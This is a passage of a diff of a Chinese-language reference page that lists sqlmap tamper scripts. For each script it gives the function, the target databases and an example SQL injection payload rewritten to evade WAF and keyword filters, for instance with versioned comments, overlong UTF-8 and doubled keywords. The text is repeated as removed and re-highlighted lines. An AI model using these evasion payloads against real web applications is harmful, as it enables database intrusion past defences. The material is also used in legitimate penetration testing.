+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="mi">1</span> <span class="n">AND</span> <span class="n">A</span> <span class="o">&gt;</span> <span class="n">B</span> <span class="o">==&gt;</span> <span class="mi">1</span> <span class="n">AND</span> <span class="n">GREATEST</span> <span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="n">A</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="err">和</span> <span class="n">b</span><span class="o">+</span><span class="mi">1</span> <span class="err">比较，取两者中的最大值为</span> <span class="n">a</span><span class="err">；则</span> <span class="n">a</span> <span class="o">&gt;=</span> <span class="n">b</span><span class="o">+</span><span class="mi">1</span><span class="err">，亦即</span> <span class="n">a</span> <span class="o">&gt;</span> <span class="n">b</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">halfversionedmorekeywords.py
-</span></span><span class="line"><span class="cl">功能：空格 ==&gt; / !0 （在关键字前添加注释）
-</span></span><span class="line"><span class="cl">平台：MySQL 4.0.18, 5.0.22（Mysql &lt; 5.1）
-</span></span><span class="line"><span class="cl">举例：union ==&gt; /!0union
+</span></span><span class="line"><span class="cl"><span class="n">halfversionedmorekeywords</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：空格</span> <span class="o">==&gt;</span> <span class="o">/</span> <span class="o">!</span><span class="mi">0</span> <span class="err">（在关键字前添加注释）</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">MySQL</span> <span class="mf">4.0</span><span class="o">.</span><span class="mi">18</span><span class="p">,</span> <span class="mf">5.0</span><span class="o">.</span><span class="mi">22</span><span class="err">（</span><span class="n">Mysql</span> <span class="o">&lt;</span> <span class="mf">5.1</span><span class="err">）</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">union</span> <span class="o">==&gt;</span> <span class="o">/!</span><span class="mi">0</span><span class="n">union</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">ifnull2ifisnull.py
-</span></span><span class="line"><span class="cl">功能：IFNULL (A, B) ==&gt; IF (ISNULL (A), B, A)
-</span></span><span class="line"><span class="cl">平台：MySQL 5.0 and 5.5
-</span></span><span class="line"><span class="cl">举例：IFNULL (1, 2) ==&gt; IF (ISNULL (1),2,1)
+</span></span><span class="line"><span class="cl"><span class="n">ifnull2ifisnull</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：</span><span class="n">IFNULL</span> <span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">)</span> <span class="o">==&gt;</span> <span class="n">IF</span> <span class="p">(</span><span class="n">ISNULL</span> <span class="p">(</span><span class="n">A</span><span class="p">),</span> <span class="n">B</span><span class="p">,</span> <span class="n">A</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">MySQL</span> <span class="mf">5.0</span> <span class="ow">and</span> <span class="mf">5.5</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">IFNULL</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">==&gt;</span> <span class="n">IF</span> <span class="p">(</span><span class="n">ISNULL</span> <span class="p">(</span><span class="mi">1</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">informationschemacomment.py
-</span></span><span class="line"><span class="cl">功能：
-</span></span><span class="line"><span class="cl">在 information_schema 后面加上 // ，用于绕过对 information_schema 的情况
-</span></span><span class="line"><span class="cl">retVal = re.sub(r”(?i)(information_schema).”, “g&lt;1&gt;/ /.”, payload)
-</span></span><span class="line"><span class="cl">平台：All
-</span></span><span class="line"><span class="cl">举例：select table_name from information_schema.tables ==&gt; select table_name from information_schema/**/.tables
+</span></span><span class="line"><span class="cl"><span class="n">informationschemacomment</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：</span>
+</span></span><span class="line"><span class="cl"><span class="err">在</span> <span class="n">information_schema</span> <span class="err">后面加上</span> <span class="o">//</span> <span class="err">，用于绕过对</span> <span class="n">information_schema</span> <span class="err">的情况</span>
+</span></span><span class="line"><span class="cl"><span class="n">retVal</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="n">r</span><span class="err">”</span><span class="p">(</span><span class="err">?</span><span class="n">i</span><span class="p">)(</span><span class="n">information_schema</span><span class="p">)</span><span class="o">.</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="n">g</span><span class="o">&lt;</span><span class="mi">1</span><span class="o">&gt;/</span> <span class="o">/.</span><span class="err">”</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">All</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">select</span> <span class="n">table_name</span> <span class="n">from</span> <span class="n">information_schema</span><span class="o">.</span><span class="n">tables</span> <span class="o">==&gt;</span> <span class="n">select</span> <span class="n">table_name</span> <span class="n">from</span> <span class="n">information_schema</span><span class="o">/**/.</span><span class="n">tables</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">lowercase.py
-</span></span><span class="line"><span class="cl">功能：将 payload 里的大写转为小写
-</span></span><span class="line"><span class="cl">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
-</span></span><span class="line"><span class="cl">举例：SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==&gt; select table_name from information_schema.tables
+</span></span><span class="line"><span class="cl"><span class="n">lowercase</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：将</span> <span class="n">payload</span> <span class="err">里的大写转为小写</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">Mssql</span> <span class="mi">2005</span><span class="err">、</span><span class="n">MySQL</span> <span class="mi">4</span><span class="p">,</span> <span class="mf">5.0</span> <span class="ow">and</span> <span class="mf">5.5</span><span class="err">、</span><span class="n">Oracle</span> <span class="mi">10</span><span class="n">g</span><span class="err">、</span><span class="n">PostgreSQL</span> <span class="mf">8.3</span><span class="p">,</span> <span class="mf">8.4</span><span class="p">,</span> <span class="mf">9.0</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">SELECT</span> <span class="n">table_name</span> <span class="n">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="o">.</span><span class="n">TABLES</span> <span class="o">==&gt;</span> <span class="n">select</span> <span class="n">table_name</span> <span class="n">from</span> <span class="n">information_schema</span><span class="o">.</span><span class="n">tables</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">modsecurityversioned.py
-</span></span><span class="line"><span class="cl">功能：用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf
-</span></span><span class="line"><span class="cl">平台：MySQL 5.0
-</span></span><span class="line"><span class="cl">举例：1 AND 2&gt;1–  ==&gt; 1 /!30874AND 2&gt;1/–
+</span></span><span class="line"><span class="cl"><span class="n">modsecurityversioned</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用注释来包围完整的查询语句，用于绕过</span> <span class="n">ModSecurity</span> <span class="err">开源</span> <span class="n">waf</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">MySQL</span> <span class="mf">5.0</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="mi">1</span> <span class="n">AND</span> <span class="mi">2</span><span class="o">&gt;</span><span class="mi">1</span><span class="err">–</span>  <span class="o">==&gt;</span> <span class="mi">1</span> <span class="o">/!</span><span class="mi">30874</span><span class="n">AND</span> <span class="mi">2</span><span class="o">&gt;</span><span class="mi">1</span><span class="o">/</span><span class="err">–</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">modsecurityzeroversioned.py
-</span></span><span class="line"><span class="cl">功能：用注释来包围完整的查询语句，用于绕过 waf ，和上面类似
-</span></span><span class="line"><span class="cl">平台：Mysql
-</span></span><span class="line"><span class="cl">举例：1 and 2&gt;1–+ ==&gt; 1 /!00000and 2&gt;1/–+
+</span></span><span class="line"><span class="cl"><span class="n">modsecurityzeroversioned</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用注释来包围完整的查询语句，用于绕过</span> <span class="n">waf</span> <span class="err">，和上面类似</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">Mysql</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="mi">1</span> <span class="ow">and</span> <span class="mi">2</span><span class="o">&gt;</span><span class="mi">1</span><span class="err">–</span><span class="o">+</span> <span class="o">==&gt;</span> <span class="mi">1</span> <span class="o">/!</span><span class="mi">00000</span><span class="ow">and</span> <span class="mi">2</span><span class="o">&gt;</span><span class="mi">1</span><span class="o">/</span><span class="err">–</span><span class="o">+</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">multiplespaces.py
-</span></span><span class="line"><span class="cl">功能：围绕 SQL 关键字添加多个空格
-</span></span><span class="line"><span class="cl">平台：All
-</span></span><span class="line"><span class="cl">举例：1 UNION SELECT foobar ==&gt; 1   UNION   SELECT   foobar
+</span></span><span class="line"><span class="cl"><span class="n">multiplespaces</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：围绕</span> <span class="n">SQL</span> <span class="err">关键字添加多个空格</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">All</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="mi">1</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="n">foobar</span> <span class="o">==&gt;</span> <span class="mi">1</span>   <span class="n">UNION</span>   <span class="n">SELECT</span>   <span class="n">foobar</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">nonrecursivereplacement.py
-</span></span><span class="line"><span class="cl">功能：关键字双写，可用于关键字过滤
-</span></span><span class="line"><span class="cl">平台：All
-</span></span><span class="line"><span class="cl">举例：1 UNION SELECT 2–  ==&gt; 1 UNIONUNION SELESELECTCT 2–
+</span></span><span class="line"><span class="cl"><span class="n">nonrecursivereplacement</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：关键字双写，可用于关键字过滤</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">All</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="mi">1</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">2</span><span class="err">–</span>  <span class="o">==&gt;</span> <span class="mi">1</span> <span class="n">UNIONUNION</span> <span class="n">SELESELECTCT</span> <span class="mi">2</span><span class="err">–</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">overlongutf8.py
-</span></span><span class="line"><span class="cl">功能： 转换给定的 payload 当中的所有字符
-</span></span><span class="line"><span class="cl">平台：All
-</span></span><span class="line"><span class="cl">举例：SELECT FIELD FROM TABLE WHERE 2&gt;1 ==&gt; SELECT% C0% AAFIELD% C0% AAFROM% C0% AATABLE% C0% AAWHERE% C0% AA2% C0% BE1
+</span></span><span class="line"><span class="cl"><span class="n">overlongutf8</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：</span> <span class="err">转换给定的</span> <span class="n">payload</span> <span class="err">当中的所有字符</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">All</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">SELECT</span> <span class="n">FIELD</span> <span class="n">FROM</span> <span class="n">TABLE</span> <span class="n">WHERE</span> <span class="mi">2</span><span class="o">&gt;</span><span class="mi">1</span> <span class="o">==&gt;</span> <span class="n">SELECT</span><span class="o">%</span> <span class="n">C0</span><span class="o">%</span> <span class="n">AAFIELD</span><span class="o">%</span> <span class="n">C0</span><span class="o">%</span> <span class="n">AAFROM</span><span class="o">%</span> <span class="n">C0</span><span class="o">%</span> <span class="n">AATABLE</span><span class="o">%</span> <span class="n">C0</span><span class="o">%</span> <span class="n">AAWHERE</span><span class="o">%</span> <span class="n">C0</span><span class="o">%</span> <span class="n">AA2</span><span class="o">%</span> <span class="n">C0</span><span class="o">%</span> <span class="n">BE1</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">percentage.py
-</span></span><span class="line"><span class="cl">功能：用百分号来绕过关键字过滤，在关键字的每个字母前面都加一个 (%)
-</span></span><span class="line"><span class="cl">平台：Mssql 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0
-</span></span><span class="line"><span class="cl">举例：SELECT FIELD FROM TABLE ==&gt; % S% E% L% E% C% T % F% I% E% L% D % F% R% O% M % T% A% B% L% E
+</span></span><span class="line"><span class="cl"><span class="n">percentage</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用百分号来绕过关键字过滤，在关键字的每个字母前面都加一个</span> <span class="p">(</span><span class="o">%</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">Mssql</span> <span class="mi">2000</span><span class="p">,</span> <span class="mi">2005</span><span class="err">、</span><span class="n">MySQL</span> <span class="mf">5.1</span><span class="o">.</span><span class="mi">56</span><span class="p">,</span> <span class="mf">5.5</span><span class="o">.</span><span class="mi">11</span><span class="err">、</span><span class="n">PostgreSQL</span> <span class="mf">9.0</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">SELECT</span> <span class="n">FIELD</span> <span class="n">FROM</span> <span class="n">TABLE</span> <span class="o">==&gt;</span> <span class="o">%</span> <span class="n">S</span><span class="o">%</span> <span class="n">E</span><span class="o">%</span> <span class="n">L</span><span class="o">%</span> <span class="n">E</span><span class="o">%</span> <span class="n">C</span><span class="o">%</span> <span class="n">T</span> <span class="o">%</span> <span class="n">F</span><span class="o">%</span> <span class="n">I</span><span class="o">%</span> <span class="n">E</span><span class="o">%</span> <span class="n">L</span><span class="o">%</span> <span class="n">D</span> <span class="o">%</span> <span class="n">F</span><span class="o">%</span> <span class="n">R</span><span class="o">%</span> <span class="n">O</span><span class="o">%</span> <span class="n">M</span> <span class="o">%</span> <span class="n">T</span><span class="o">%</span> <span class="n">A</span><span class="o">%</span> <span class="n">B</span><span class="o">%</span> <span class="n">L</span><span class="o">%</span> <span class="n">E</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">randomcase.py
-</span></span><span class="line"><span class="cl">功能：将 payload 随机大小写
-</span></span><span class="line"><span class="cl">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
-</span></span><span class="line"><span class="cl">举例：INSERT ==&gt; InseRt
+</span></span><span class="line"><span class="cl"><span class="n">randomcase</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：将</span> <span class="n">payload</span> <span class="err">随机大小写</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">Mssql</span> <span class="mi">2005</span><span class="err">、</span><span class="n">MySQL</span> <span class="mi">4</span><span class="p">,</span> <span class="mf">5.0</span> <span class="ow">and</span> <span class="mf">5.5</span><span class="err">、</span><span class="n">Oracle</span> <span class="mi">10</span><span class="n">g</span><span class="err">、</span><span class="n">PostgreSQL</span> <span class="mf">8.3</span><span class="p">,</span> <span class="mf">8.4</span><span class="p">,</span> <span class="mf">9.0</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">INSERT</span> <span class="o">==&gt;</span> <span class="n">InseRt</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">randomcomments.py
-</span></span><span class="line"><span class="cl">功能：在 payload 的关键字中间随机插入注释符 /**/ ，可用于绕过关键字过滤
-</span></span><span class="line"><span class="cl">平台：Mysql
-</span></span><span class="line"><span class="cl">举例：INSERT ==&gt; I / ** / N / ** / SERT
+</span></span><span class="line"><span class="cl"><span class="n">randomcomments</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：在</span> <span class="n">payload</span> <span class="err">的关键字中间随机插入注释符</span> <span class="o">/**/</span> <span class="err">，可用于绕过关键字过滤</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">Mysql</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">INSERT</span> <span class="o">==&gt;</span> <span class="n">I</span> <span class="o">/</span> <span class="o">**</span> <span class="o">/</span> <span class="n">N</span> <span class="o">/</span> <span class="o">**</span> <span class="o">/</span> <span class="n">SERT</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">securesphere.py
-</span></span><span class="line"><span class="cl">功能：在 payload 后追加特殊构造的字符串
-</span></span><span class="line"><span class="cl">平台：All
-</span></span><span class="line"><span class="cl">举例：1 AND 1=1 ==&gt; 1 AND 1=1 and ‘0having’=’0having’
+</span></span><span class="line"><span class="cl"><span class="n">securesphere</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：在</span> <span class="n">payload</span> <span class="err">后追加特殊构造的字符串</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">All</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="mi">1</span> <span class="n">AND</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="o">==&gt;</span> <span class="mi">1</span> <span class="n">AND</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="ow">and</span> <span class="err">‘</span><span class="mi">0</span><span class="n">having</span><span class="err">’</span><span class="o">=</span><span class="err">’</span><span class="mi">0</span><span class="n">having</span><span class="err">’</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">space2comment.py
-</span></span><span class="line"><span class="cl">功能：用注释符 // 代替空格，用于空格的绕过
-</span></span><span class="line"><span class="cl">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
-</span></span><span class="line"><span class="cl">举例：SELECT id FROM users ==&gt; SELECT//id//FROM//users
+</span></span><span class="line"><span class="cl"><span class="n">space2comment</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用注释符</span> <span class="o">//</span> <span class="err">代替空格，用于空格的绕过</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">Mssql</span> <span class="mi">2005</span><span class="err">、</span><span class="n">MySQL</span> <span class="mi">4</span><span class="p">,</span> <span class="mf">5.0</span> <span class="ow">and</span> <span class="mf">5.5</span><span class="err">、</span><span class="n">Oracle</span> <span class="mi">10</span><span class="n">g</span><span class="err">、</span><span class="n">PostgreSQL</span> <span class="mf">8.3</span><span class="p">,</span> <span class="mf">8.4</span><span class="p">,</span> <span class="mf">9.0</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">SELECT</span> <span class="n">id</span> <span class="n">FROM</span> <span class="n">users</span> <span class="o">==&gt;</span> <span class="n">SELECT</span><span class="o">//</span><span class="n">id</span><span class="o">//</span><span class="n">FROM</span><span class="o">//</span><span class="n">users</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">space2dash.py
-</span></span><span class="line"><span class="cl">功能：用 [注释符 (–)+ 一个随机字符串 + 一个换行符] 替换控制符
-</span></span><span class="line"><span class="cl">平台：MSSQL、 SQLite
-</span></span><span class="line"><span class="cl">举例：union select 1,2–+ ==&gt; union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+
+</span></span><span class="line"><span class="cl"><span class="n">space2dash</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用</span> <span class="p">[</span><span class="err">注释符</span> <span class="p">(</span><span class="err">–</span><span class="p">)</span><span class="o">+</span> <span class="err">一个随机字符串</span> <span class="o">+</span> <span class="err">一个换行符</span><span class="p">]</span> <span class="err">替换控制符</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">MSSQL</span><span class="err">、</span> <span class="n">SQLite</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="err">–</span><span class="o">+</span> <span class="o">==&gt;</span> <span class="n">union</span><span class="err">–</span><span class="n">HSHjsJh</span><span class="o">%</span><span class="mi">0</span><span class="n">Aselect</span><span class="err">–</span><span class="n">HhjHSJ</span><span class="o">%</span><span class="mi">0</span><span class="n">A1</span><span class="p">,</span><span class="mi">2</span><span class="err">–</span><span class="o">+</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">space2hash.py
-</span></span><span class="line"><span class="cl">功能：用 [注释符 (#)+ 一个随机字符串 + 一个换行符] 替换控制符
-</span></span><span class="line"><span class="cl">平台：Mysql
-</span></span><span class="line"><span class="cl">举例：union select 1,2–+ ==&gt; union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+
+</span></span><span class="line"><span class="cl"><span class="n">space2hash</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用</span> <span class="p">[</span><span class="err">注释符</span> <span class="p">(</span><span class="c1">#)+ 一个随机字符串 + 一个换行符] 替换控制符</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">Mysql</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="err">–</span><span class="o">+</span> <span class="o">==&gt;</span> <span class="n">union</span><span class="o">%</span><span class="mi">23</span><span class="n">HSHjsJh</span><span class="o">%</span><span class="mi">0</span><span class="n">Aselect</span><span class="o">%</span><span class="mi">23</span><span class="n">HhjHSJ</span><span class="o">%</span><span class="mi">0</span><span class="n">A1</span><span class="p">,</span><span class="mi">2</span><span class="err">–</span><span class="o">+</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">space2morehash.py
-</span></span><span class="line"><span class="cl">功能：用多个 [注释符 (#)+ 一个随机字符串 + 一个换行符] 替换控制符
-</span></span><span class="line"><span class="cl">平台：MySQL &gt;= 5.1.13
-</span></span><span class="line"><span class="cl">举例：union select 1,2–+ ==&gt; union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2–+
+</span></span><span class="line"><span class="cl"><span class="n">space2morehash</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用多个</span> <span class="p">[</span><span class="err">注释符</span> <span class="p">(</span><span class="c1">#)+ 一个随机字符串 + 一个换行符] 替换控制符</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">MySQL</span> <span class="o">&gt;=</span> <span class="mf">5.1</span><span class="o">.</span><span class="mi">13</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="err">–</span><span class="o">+</span> <span class="o">==&gt;</span> <span class="n">union</span> <span class="o">%</span><span class="mi">23</span> <span class="n">HSHjsJh</span> <span class="o">%</span><span class="mi">0</span><span class="n">A</span> <span class="n">select</span> <span class="o">%</span><span class="mi">23</span> <span class="n">HhjHSJ</span> <span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">23</span> <span class="n">HJHJhj</span> <span class="o">%</span><span class="mi">0</span><span class="n">A</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="err">–</span><span class="o">+</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">space2mssqlblank.py
-</span></span><span class="line"><span class="cl">功能：用随机的空白符替换 payload 中的空格
-</span></span><span class="line"><span class="cl">blanks = (‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)
-</span></span><span class="line"><span class="cl">平台：Mssql 2000,2005
-</span></span><span class="line"><span class="cl">举例：SELECT id FROM users ==&gt; SELECT%0Eid%0DFROM%07users
+</span></span><span class="line"><span class="cl"><span class="n">space2mssqlblank</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用随机的空白符替换</span> <span class="n">payload</span> <span class="err">中的空格</span>
+</span></span><span class="line"><span class="cl"><span class="n">blanks</span> <span class="o">=</span> <span class="p">(</span><span class="err">‘</span><span class="o">%</span><span class="mi">01</span><span class="err">’</span><span class="p">,</span> <span class="err">‘</span><span class="o">%</span><span class="mi">02</span><span class="err">’</span><span class="p">,</span> <span class="err">‘</span><span class="o">%</span><span class="mi">03</span><span class="err">’</span><span class="p">,</span> <span class="err">‘</span><span class="o">%</span><span class="mi">04</span><span class="err">’</span><span class="p">,</span> <span class="err">‘</span><span class="o">%</span><span class="mi">05</span><span class="err">’</span><span class="p">,</span> <span class="err">‘</span><span class="o">%</span><span class="mi">06</span><span class="err">’</span><span class="p">,</span> <span class="err">‘</span><span class="o">%</span><span class="mi">07</span><span class="err">’</span><span class="p">,</span> <span class="err">‘</span><span class="o">%</span><span class="mi">08</span><span class="err">’</span><span class="p">,</span> <span class="err">‘</span><span class="o">%</span><span class="mi">09</span><span class="err">’</span><span class="p">,</span> <span class="err">‘</span><span class="o">%</span><span class="mi">0</span><span class="n">B</span><span class="err">’</span><span class="p">,</span> <span class="err">‘</span><span class="o">%</span><span class="mi">0</span><span class="n">C</span><span class="err">’</span><span class="p">,</span> <span class="err">‘</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="err">’</span><span class="p">,</span> <span class="err">‘</span><span class="o">%</span><span class="mi">0</span><span class="n">E</span><span class="err">’</span><span class="p">,</span> <span class="err">‘</span><span class="o">%</span><span class="mi">0</span><span class="n">F</span><span class="err">’</span><span class="p">,</span> <span class="err">‘</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="err">’</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">Mssql</span> <span class="mi">2000</span><span class="p">,</span><span class="mi">2005</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">SELECT</span> <span class="n">id</span> <span class="n">FROM</span> <span class="n">users</span> <span class="o">==&gt;</span> <span class="n">SELECT</span><span class="o">%</span><span class="mi">0</span><span class="n">Eid</span><span class="o">%</span><span class="mi">0</span><span class="n">DFROM</span><span class="o">%</span><span class="mi">07</span><span class="n">users</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">space2mssqlhash.py
-</span></span><span class="line"><span class="cl">功能：用 [字符# + 一个换行符] 替换 payload 中的空格
-</span></span><span class="line"><span class="cl">平台：MSSQL、MySQL
-</span></span><span class="line"><span class="cl">举例：union select 1,2–+ ==&gt; union%23%0Aselect%23%0A1,2–+
+</span></span><span class="line"><span class="cl"><span class="n">space2mssqlhash</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用</span> <span class="p">[</span><span class="err">字符</span><span class="c1"># + 一个换行符] 替换 payload 中的空格</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">MSSQL</span><span class="err">、</span><span class="n">MySQL</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="err">–</span><span class="o">+</span> <span class="o">==&gt;</span> <span class="n">union</span><span class="o">%</span><span class="mi">23</span><span class="o">%</span><span class="mi">0</span><span class="n">Aselect</span><span class="o">%</span><span class="mi">23</span><span class="o">%</span><span class="mi">0</span><span class="n">A1</span><span class="p">,</span><span class="mi">2</span><span class="err">–</span><span class="o">+</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">space2plus.py
-</span></span><span class="line"><span class="cl">功能：用加号 (+) 替换空格
-</span></span><span class="line"><span class="cl">平台：All
-</span></span><span class="line"><span class="cl">举例：SELECT id FROM users ==&gt; SELECT+id+FROM+users
+</span></span><span class="line"><span class="cl"><span class="n">space2plus</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用加号</span> <span class="p">(</span><span class="o">+</span><span class="p">)</span> <span class="err">替换空格</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">All</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">SELECT</span> <span class="n">id</span> <span class="n">FROM</span> <span class="n">users</span> <span class="o">==&gt;</span> <span class="n">SELECT</span><span class="o">+</span><span class="n">id</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">users</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">space2randomblank.py
-</span></span><span class="line"><span class="cl">功能：用随机的空白符替换 payload 中的空格
-</span></span><span class="line"><span class="cl">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
